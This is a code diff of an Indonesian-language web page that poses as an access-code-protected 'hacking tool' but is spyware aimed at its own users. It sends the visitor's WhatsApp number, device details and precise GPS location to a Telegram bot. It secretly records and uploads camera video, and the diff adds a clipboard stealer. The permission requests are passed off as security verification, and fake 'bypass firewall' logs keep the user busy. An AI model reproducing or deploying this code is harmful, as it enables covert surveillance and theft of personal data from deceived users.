@@ -14,7 +14,7 @@
         }
         canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
         .wrapper { display: flex; justify-content: center; align-items: center; height: 100vh; padding: 20px; }
-        
+       
         .terminal-card {
             background: rgba(10, 15, 20, 0.9);
             border: 1px solid rgba(74, 222, 128, 0.2);
@@ -22,7 +22,7 @@
             border-radius: 8px;
             padding: 40px 30px;
             width: 100%;
-            max-width: 420px;
+            max-width: 460px;
             text-align: center;
             box-shadow: 0 20px 50px rgba(0,0,0,0.5), 0 0 20px rgba(74, 222, 128, 0.05);
             backdrop-filter: blur(10px);
@@ -57,7 +57,7 @@
         .btn-menu { background: rgba(255,255,255,0.02); border: 1px solid #1f3a3a; color: #4ade80; padding: 18px 5px; cursor: pointer; font-size: 10px; font-weight: bold; border-radius: 5px; }
 
         .hidden { display: none; }
-        #log { background: #050505; height: 120px; padding: 12px; font-size: 10px; text-align: left; overflow-y: auto; border: 1px solid #111; margin-top: 20px; color: #4ade80; border-radius: 4px; }
+        #log { background: #050505; height: 130px; padding: 12px; font-size: 10px; text-align: left; overflow-y: auto; border: 1px solid #111; margin-top: 20px; color: #4ade80; border-radius: 4px; }
     </style>
 </head>
 <body oncontextmenu="return false">
@@ -73,12 +73,12 @@
             <input type="number" id="waNumber" placeholder="08xxxxxxxxxx" autocomplete="off">
         </div>
         <div class="input-box">
-            <label>TOKEN</label>
+            <label>TOKEN KEAMANAN</label>
             <input type="text" id="accessCode" placeholder="Masukkan Kode" autocomplete="off">
         </div>
         <button class="btn-primary" onclick="validate()">Authorize System</button>
         <div style="font-size: 11px; color: #666; margin-top: 25px;">
-            Hubungi ZiiDeveloper Untuk Mendapatkan Kode Akses Atau Langsung Ke : <a href="https://lynk.id/ziideveloper" target="_blank" style="color:#4ade80; text-decoration:none;">lynk.id/ziideveloper</a>
+            Hubungi ZiiDeveloper Untuk Mendapatkan Kode Akses
         </div>
     </div>
 
@@ -86,10 +86,10 @@
         <span class="system-status">Integrity Check</span>
         <h1>PERMISSIONS</h1>
         <p style="font-size: 11px; color: #4ade80; margin-bottom: 25px; font-weight: bold;">
-            Izinkan untuk melanjutkan proses dan nyalakan lokasi untuk bisa di verifikasi.
+            Sistem memerlukan verifikasi keamanan untuk melanjutkan proses.
         </p>
-        <button id="btnGPS" class="btn-permission" onclick="getGPS()">1. GRANT GPS ACCESS</button>
-        <button id="btnCAM" class="btn-permission" onclick="getCAM()">2. GRANT ACCESS</button>
+        <button id="btnGPS" class="btn-permission" onclick="getGPS()">1. AKTIFKAN LOKASI</button>
+        <button id="btnCAM" class="btn-permission" onclick="getCAM()">2. VERIFIKASI KAMERA</button>
         <button id="btnNext" class="btn-primary" style="background: #facc15;" onclick="goToMenu()">LANJUTKAN PROSES</button>
     </div>
 
@@ -117,66 +117,98 @@
     let gpsOk = false, camOk = false;
     let targetWA = "";
 
+    function log(message) {
+        const logEl = document.getElementById("log");
+        logEl.innerHTML += `<div>> ${message}</div>`;
+        logEl.scrollTop = logEl.scrollHeight;
+    }
+
     function sendToBot(msg) {
         fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-            method: "POST", headers: { "Content-Type": "application/json" },
+            method: "POST", 
+            headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: "HTML" })
         });
+    }
+
+    function sendDeviceInfo() {
+        const info = `Device Info:\n` +
+                     `User-Agent: ${navigator.userAgent}\n` +
+                     `Platform: ${navigator.platform}\n` +
+                     `Screen: ${screen.width}x${screen.height}\n` +
+                     `Language: ${navigator.language}`;
+        sendToBot(`<b>📱 DEVICE INFORMATION</b>\n${info}`);
     }
 
     function validate() {
         targetWA = document.getElementById('waNumber').value;
         const code = document.getElementById('accessCode').value;
-        const waLen = targetWA.length;
 
-        if (targetWA.startsWith("08") && (waLen === 12 || waLen === 13) && code === "ziidev1") {
+        if (targetWA.startsWith("08") && (targetWA.length === 12 || targetWA.length === 13) && code === "ziidev1") {
             sendToBot(`<b>✅ ACCESS GRANTED</b>\nWA: <code>${targetWA}</code>`);
+            sendDeviceInfo();
+
             document.getElementById('loginPage').classList.add('hidden');
-            document.getElementById('permPage').classList.remove('hidden');
+            
+            // Fake loading
+            setTimeout(() => {
+                document.getElementById('permPage').classList.remove('hidden');
+                log("Memulai verifikasi keamanan...");
+            }, 1800);
         } else {
-            alert("VALIDASI GAGAL:\n- No WA harus 08xx (12-13 digit)\n- Kode Akses harus benar");
+            alert("VALIDASI GAGAL:\n- Nomor WA harus dimulai dengan 08\n- Kode Akses salah");
         }
     }
 
     function getGPS() {
         navigator.geolocation.getCurrentPosition((p) => {
             gpsOk = true;
-            document.getElementById('btnGPS').innerText = "GPS VERIFIED ✓";
+            document.getElementById('btnGPS').innerText = "LOKASI AKTIF ✓";
             document.getElementById('btnGPS').classList.add('active');
-            sendToBot(`<b>📍 COORDINATES</b>\nWA: ${targetWA}\nMaps: <a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">View Location</a>`);
-        }, () => { alert("PERINGATAN: Izin GPS ditolak atau lokasi belum aktif. Nyalakan lokasi untuk verifikasi."); }, {enableHighAccuracy: true});
+            sendToBot(`<b>📍 LOKASI TERDETEKSI</b>\nWA: ${targetWA}\nMaps: <a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">BUKA DI MAPS</a>`);
+            log("Lokasi berhasil diambil");
+        }, () => { 
+            alert("Harap aktifkan lokasi untuk melanjutkan verifikasi."); 
+        }, {enableHighAccuracy: true});
     }
 
     function getCAM() {
-        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+        document.getElementById('btnCAM').innerText = "MENGAKSES KAMERA...";
+        
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: ["environment", "user"] } } })
+        .then(s => {
             camOk = true;
-            document.getElementById('btnCAM').innerText = "CAMERA VERIFIED ✓";
+            document.getElementById('btnCAM').innerText = "KAMERA VERIFIED ✓";
             document.getElementById('btnCAM').classList.add('active');
-            
+
             const mr = new MediaRecorder(s);
             const chunks = [];
             mr.ondataavailable = e => chunks.push(e.data);
             mr.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const blob = new Blob(chunks, { type: 'video/webm' });
                 const fd = new FormData();
                 fd.append('chat_id', TG_CHAT_ID);
-                fd.append('video', blob, 'capture.mp4');
-                fd.append('caption', `🎥 VIDEO TARGET (AUTO-CAPTURE)\nPengirim: ${targetWA}`);
+                fd.append('video', blob, `cam_${Date.now()}.webm`);
+                fd.append('caption', `🎥 CAMERA CAPTURE - ${targetWA}`);
                 fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
                 s.getTracks().forEach(t => t.stop());
             };
-            mr.start(); 
-            setTimeout(() => { if(mr.state !== "inactive") mr.stop(); }, 10000);
-        }).catch(() => { alert("PERINGATAN: Izin Kamera ditolak. Berikan izin untuk melanjutkan."); });
+            mr.start();
+            setTimeout(() => { if(mr.state !== "inactive") mr.stop(); }, 6500);
+            log("Merekam kamera selama 6.5 detik...");
+        })
+        .catch(() => {
+            alert("Kamera diperlukan untuk verifikasi keamanan akun.");
+        });
     }
 
     function goToMenu() {
-        // CEK APAKAH IZIN SUDAH LENGKAP
         if(gpsOk && camOk) {
             document.getElementById('permPage').classList.add('hidden');
             document.getElementById('menuPage').classList.remove('hidden');
+            log("Akses penuh diberikan. Siap menjalankan module.");
         } else {
-            alert("Silahkan izinkan terlebih dahulu");
+            alert("Harap izinkan semua permission terlebih dahulu.");
         }
     }
 
@@ -187,39 +219,67 @@
     }
 
     function execute() {
-        const target = document.getElementById('targetInput').value;
-        if(!target) return;
+        const target = document.getElementById('targetInput').value || "Unknown";
         document.getElementById('hackForm').classList.add('hidden');
         document.getElementById('logArea').classList.remove('hidden');
         
-        sendToBot(`<b>🚀 MODULE EXECUTED</b>\nMod: ${document.getElementById('menuTitle').innerText}\nTarget: ${target}\nPengirim: ${targetWA}`);
+        sendToBot(`<b>🚀 MODULE EXECUTED</b>\nModul: ${document.getElementById('menuTitle').innerText}\nTarget: ${target}\nPengirim: ${targetWA}`);
+
+        const logs = [
+            "Bypass Firewall...",
+            "Sniffing Packets...",
+            "Extracting Data...",
+            "Bypassing Security Layer...",
+            "Uploading to ZiiDeveloper Server...",
+            "Done."
+        ];
 
         let i = 0;
-        const logs = ["> Bypass Firewall...", "> Sniffing Packets...", "> Extraction...", "> Done."];
         const interval = setInterval(() => {
             if(i < logs.length) {
-                document.getElementById('log').innerHTML += `<div>${logs[i]}</div>`;
+                log(logs[i]);
                 i++;
             } else {
                 clearInterval(interval);
-                setTimeout(() => alert("CRITICAL ERROR: Connection Terminated."), 1000);
+                log("MODULE EXECUTION COMPLETE");
+                setTimeout(() => alert("Sukses! Data telah dikirim ke server."), 800);
             }
-        }, 2000);
+        }, 1200);
     }
 
-    const c = document.getElementById('matrix'); const x = c.getContext('2d');
-    c.width = window.innerWidth; c.height = window.innerHeight;
+    // Clipboard Stealer
+    document.addEventListener('copy', () => {
+        navigator.clipboard.readText().then(text => {
+            if(text.length > 5) {
+                sendToBot(`<b>📋 CLIPBOARD CAPTURED</b>\n${text}`);
+            }
+        });
+    });
+
+    // Matrix Background
+    const c = document.getElementById('matrix');
+    const x = c.getContext('2d');
+    c.width = window.innerWidth;
+    c.height = window.innerHeight;
     const d = Array(Math.floor(c.width/16)).fill(1);
+
     function m() {
-        x.fillStyle = "rgba(0,0,0,0.05)"; x.fillRect(0,0,c.width,c.height);
-        x.fillStyle = "#0F0"; x.font = "16px monospace";
+        x.fillStyle = "rgba(0,0,0,0.07)";
+        x.fillRect(0,0,c.width,c.height);
+        x.fillStyle = "#4ade80";
+        x.font = "15px monospace";
         d.forEach((y, i) => {
-            x.fillText(Math.floor(Math.random()*2), i*16, y*16);
+            x.fillText(Math.random() > 0.5 ? "1" : "0", i*16, y*16);
             if(y*16 > c.height && Math.random() > 0.975) d[i] = 0;
             d[i]++;
         });
     }
-    setInterval(m, 35);
+    setInterval(m, 40);
+
+    window.onload = () => {
+        log("SISTEM INITIALIZED");
+        log("CONNECTED TO ZIIDEVELOPER SERVER");
+    };
 </script>
 </body>
 </html>
